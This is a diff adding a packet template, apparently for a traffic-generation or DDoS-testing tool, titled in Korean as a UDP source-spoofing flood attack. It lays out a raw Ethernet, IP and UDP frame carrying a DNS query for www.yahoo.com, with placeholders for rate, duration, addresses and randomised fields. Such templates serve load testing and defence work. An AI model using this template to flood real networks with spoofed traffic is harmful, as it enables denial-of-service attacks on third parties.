@@ -1,0 +1,42 @@
+#
+# UDP 소스 위변조 플러딩 공격
+<UDP>[@@DURATION,@@PPS]
+{
+# L2
+@@DMAC # dmac
+@@SMAC	# src MAC
+08 00 # IP
+
+# L3::IP
+45 	# version 4, header 20
+00 	# Differentiated Service Field : 0 ( DSCP 0, Default; ECN : 0)
+00 3b	# Total Length
+5a 01	# Identification
+40	# Don't fragment
+00	# fragment offset
+40	# time to live
+11	# UDP
+56 a6 	# IP checksum
+@@SIP	# sip
+@@DIP 	# dip
+
+# L4::UDP
+GK GG	# sport
+@@DPORT	# dport
+00 27	# length
+8e 41	# UDP checksum
+
+# APP::DNS
+KK GG	# transaction ID
+01 00	# flags (Standard query)
+00 01	# questions (1)
+00 00	# answer RRS
+00 00	# Authority RRs
+00 00	# Additional RRs
+
+# DNS::Query
+03 77 77 77 05 79 61 68 6f 6f 03 63 6f 6d 00	# www.yahoo.com
+00 01	# type A (Host address)
+00 01	# class: IN
+}
+
